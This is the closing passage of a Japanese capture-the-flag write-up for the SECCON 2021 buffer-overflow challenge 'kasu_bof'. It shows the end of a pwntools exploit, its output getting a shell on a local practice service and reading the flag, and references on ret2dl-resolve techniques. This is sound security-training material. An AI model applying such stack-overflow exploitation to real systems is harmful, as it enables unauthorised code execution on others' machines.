</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-20" class="outline-5">
<h5 id="headline-20">
実行結果
</h5>
<div id="outline-text-headline-20" class="outline-text-5">
<pre class="example">
mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
[*] &#39;/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall&#39;
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 9001: Done
[*] Switching to interactive mode
$ ls
chall
flag-4f8e964cf95b989f6def1afdfd0e91b7.txt
$ cat flag*
SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
</pre>
</div>
</div>
<div id="outline-container-headline-21" class="outline-5">
<h5 id="headline-21">
<code>SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}</code>
</h5>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-22" class="outline-3">
<h3 id="headline-22">
参考
</h3>
<div id="outline-text-headline-22" class="outline-text-3">
<ul>
<li>
<p>詳解セキュリティコンテスト</p>
<ul>
<li><a href="https://book.mynavi.jp/ec/products/detail/id=122750">https://book.mynavi.jp/ec/products/detail/id=122750</a></li>
<li>33.2.2 発展：関数シンボルの動的解決 pp.525</li>
</ul>
</li>
<li>
<p>ROP stager + Return-to-dl-resolveによるASLR+DEP回避 - ももいろテクノロジー   </p>
<ul>
<li><a href="https://inaz2.hatenablog.com/entry/2014/07/15/023406">https://inaz2.hatenablog.com/entry/2014/07/15/023406</a></li>
</ul>
</li>
<li>
<p>ret2dl resolve - slideshare</p>
<ul>
<li><a href="https://www.slideshare.net/sounakano/ret2dl-resolve">https://www.slideshare.net/sounakano/ret2dl-resolve</a></li>
</ul>
</li>
<li>
<p>セキュリティコンテストチャレンジブック</p>
<ul>
<li><a href="https://book.mynavi.jp/ec/products/detail/id=42421">https://book.mynavi.jp/ec/products/detail/id=42421</a></li>
<li>
<p>2.4 エクスプロイト - Retrun to PLT (ret2plt) pp.109</p>
<ul>
<li>x86のROP</li>
</ul>
</li>
</ul>
</li>
<li>
<p>リンカ・ローダ実践開発テクニック</p>
<ul>
<li><a href="https://shop.cqpub.co.jp/hanbai/books/38/38071.html">https://shop.cqpub.co.jp/hanbai/books/38/38071.html</a></li>
<li>
<p>2.9 シンボル・テーブル pp.54</p>
<ul>
<li>Elf_Sym構造体について    </li>
</ul>
</li>
<li>
<p>2.10 再配置テーブル pp.57</p>
<ul>
<li>Elf_Rel構造体について</li>
</ul>
</li>
</ul>
</li>
<li>
<p>gdbに構造体定義を読み込ませて使う - ももいろテクノロジー</p>
<ul>
<li><a href="https://inaz2.hatenablog.com/entry/2014/07/21/124857">https://inaz2.hatenablog.com/entry/2014/07/21/124857</a></li>
</ul>
</li>
</ul>
</div>
</div>

    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="http://localhost:8080/team-enu.png" alt="Logo">
<h1 class="about__title">Team Enu</h1>
<p class="about__description">Team EnuのWriteupや活動の紹介を掲載しています。</p>
</div>


<ul class="aside__social-links">
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    
    
        <p>
            By mc4nf, 
            2022-11-11
        </p>
    

                </div>
            </section>

            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
      
    
    
    
</p>
<br /><br />
<p class="copyright"></p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
